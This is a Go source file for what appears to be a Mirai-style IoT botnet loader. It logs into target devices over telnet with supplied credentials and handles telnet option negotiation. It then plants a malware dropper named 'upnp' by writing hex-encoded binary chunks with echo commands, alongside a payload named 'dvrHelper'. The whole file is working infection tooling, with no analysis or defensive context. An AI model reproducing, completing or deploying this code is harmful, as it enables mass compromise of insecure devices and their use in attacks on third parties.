package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"time"

	"github.com/wonderivan/logger"
)

var TELNET_TIMEOUT int = 60
var DIAL_TIMEOUT int = 15
var FN_DROPPER string = "upnp"
var FN_BINARY string = "dvrHelper"

type TelnetTarget struct {
	host        string
	user        string
	passwd      string
	arch        string
	state       int
	timeoutChan <-chan time.Time
	readChan    chan []byte
	writeChan   chan []byte
	stopChan    chan bool
	conn        net.Conn
}

func NewTarget(host string, user string, passwd string) (*TelnetTarget, error) {
	var err error
	t := TelnetTarget{
		host:   host,
		user:   user,
		passwd: passwd,
	}
	t.conn, err = net.DialTimeout("tcp", host, time.Duration(DIAL_TIMEOUT)*time.Second)
	if err != nil {
		return nil, err
	}
	t.state = statIDLE
	t.arch = ""
	t.timeoutChan = time.After(time.Duration(TELNET_TIMEOUT) * time.Second)
	t.readChan = make(chan []byte)
	t.writeChan = make(chan []byte)
	t.stopChan = make(chan bool)

	return &t, nil
}

func (this *TelnetTarget) disConnect() {
	this.conn.Close()
}

func (this *TelnetTarget) readConn() {
	for {
		data := make([]byte, os.Getpagesize())
		n, err := this.conn.Read(data)
		if err != nil && err != io.EOF {
			break
		}
		logger.Info("R: ", string(data))

		this.readChan <- data[:n]
	}

	this.stopChan <- true
}

func (this *TelnetTarget) writeConn() {
	for {
		strData := <-this.writeChan
		logger.Info("W: ", string(strData))
		_, err := this.conn.Write(strData)
		if err != nil {
			break
		}

	}
	this.stopChan <- true
}

func (this *TelnetTarget) telnetIACS(data []byte) bool {
	if len(data) == 0 {
		return false
	}

	end := len(data) - 1
	for i := 0; i < end; {
		if data[0] != 0xff {
			return false
		} else if data[0] == 0xff {
			if end-i < 1 {
				break
			}
			if data[i+1] == 0xff {
				if end-i < 2 {
					break
				}
				i += 2
				continue
			} else if data[i+1] == 0xfd {
				//	&& data[i+2] == 31 {
				if end-i < 2 {
					break
				}
				if data[i+2] == 31 {
					tmp1 := []byte{255, 251, 31}
					this.writeChan <- tmp1
					tmp2 := []byte{255, 250, 31, 0, 80, 0, 24, 255, 240}

					this.writeChan <- tmp2
					i += 3
				} else {
					b := data[i : i+3]
					for j := 0; j < 3; j++ {
						if data[i+j] == 0xfd {
							b[j] = 0xfc
						} else if data[i+j] == 0xfb {
							b[j] = 0xfd
						}
					}
					this.writeChan <- b
					i += 3
				}
			} else {
				if end-i < 2 {
					return true
				}
				b := data[i : i+3]
				for j := 0; j < 3; j++ {
					if data[i+j] == 0xfd {
						b[j] = 0xfc
					} else if data[i+j] == 0xfb {
						b[j] = 0xfd
					}
				}
				this.writeChan <- b
				i += 3
			}

		}

	}

	return true
}

func (this *TelnetTarget) Send(data []byte) {
	this.writeChan <- data
}

func (this *TelnetTarget) EchoDlr() {
	hex_buf, ok := loader_map[this.arch]
	if !ok {
		fmt.Printf("load %s Faield\n", this.arch)
	}
	//remain_len : hex_buf剩余发送长度
	remain_len := len(hex_buf)
	//per_send : 当前发送的长度
	per_send := 0
	//hex_buf偏移
	index := 0
	var place_holder string
	var cmd string
	for {
		if index == 0 {
			place_holder = ">"
		} else {
			place_holder = ">>"
		}
		if remain_len > BINARY_BYTES_PER_ECHOLINE {
			per_send = BINARY_BYTES_PER_ECHOLINE
			remain_len = remain_len - BINARY_BYTES_PER_ECHOLINE
		} else if remain_len > 0 {
			per_send = remain_len
			remain_len = 0
		} else if remain_len == 0 {
			break
		}
		cmd = fmt.Sprintf("echo -ne '%s' %s %s\r\n", string(hex_buf[index:index+per_send]), place_holder, FN_DROPPER)
		this.writeChan <- []byte(cmd)
		index += per_send
	}
	this.writeChan <- []byte(TOKEN_QUERY)
}
